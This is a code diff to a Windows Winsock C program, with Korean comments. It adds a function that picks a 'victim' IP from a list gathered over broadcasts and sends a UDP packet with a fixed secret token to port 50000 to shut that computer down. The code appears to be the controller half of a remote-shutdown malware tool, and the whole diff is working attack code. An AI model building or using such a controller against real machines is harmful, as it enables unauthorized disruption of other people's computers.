@@ -3,7 +3,8 @@
 #include <WinSock2.h>
 #include <stdio.h>
 
-#define BROADCASTPORT 50000
+#define BROADCASTPORT 50001
+#define SHUTDOWNPORT 50000
 
 //전역변수
 char victimList[100][16] = { 0 };	//피해자 컴퓨터의 IP 목록
@@ -152,9 +153,64 @@ DWORD WINAPI broadcastReceiver(LPVOID arg)
 	return 0;
 }
 
-int shutdownVictim(int victimNumber)
+//피해자 컴퓨터를 종료시키는 함수
+int shutdownVictim(int number)
 {
 	int retval;
+
+	//입력한 번호에 피해자 IP가 있는지 확인한다.
+	if (strcmp(victimList[number - 1], "") == 0)
+	{
+		printf("입력한 번호의 피해자가 없습니다. \n");
+		return 1;
+	}
+
+	//입력한 피해자를 다시 한번 확인한다.
+	printf("%d. %s", number, victimList[number - 1]);
+	printf("해당 피해자를 종료할까요? (Y/N): ");
+	char input[10];
+	gets_s(input, sizeof(input));
+
+	//y를 누르지 않았다면 중단한다.
+	if (strcmp(input, "y") != 0)
+	{
+		printf("종료를 중단합니다. \n");
+		return 2;
+	}
+	//---------------------------------------------------------------
+
+	//통신용 소켓을 생성한다.
+	SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
+	if (sock == INVALID_SOCKET)
+		err_quit("socket()");
+
+	//브로드캐스팅을 활성화한다.
+	BOOL bEnable = TRUE;
+	retval = setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char*)& bEnable, sizeof(bEnable));
+	if (retval == SOCKET_ERROR)
+		err_quit("setsockopt()");
+
+	//원격 IP, Port번호를 설정한다.
+	SOCKADDR_IN remoteaddr = { 0 };
+	remoteaddr.sin_family = AF_INET;
+	remoteaddr.sin_addr.s_addr = inet_addr(victimList[number - 1]);
+	remoteaddr.sin_port = htons(SHUTDOWNPORT);
+
+	//통신에 사용할 변수를 선언한다.
+	char buffer[100] = { '\0' };
+
+	//송신할 데이터를 복사한다.
+	strcpy_s(buffer, sizeof(buffer), "F39422345DF99D2EAD885FA4E80CF0AD3554D8600C33B5F0B158B54E9B67AFFD");
+
+	//데이터를 전송한다.
+	retval = sendto(sock, buffer, (int)strlen(buffer) + 1, 0, (SOCKADDR*)& remoteaddr, sizeof(remoteaddr));
+	if (retval == SOCKET_ERROR)
+		err_quit("sendto()");
+
+	//통신용 소켓을 닫는다.
+	retval = closesocket(sock);
+	if (retval != 0)
+		err_display("closesocket()");
 
 	return 0;
 }
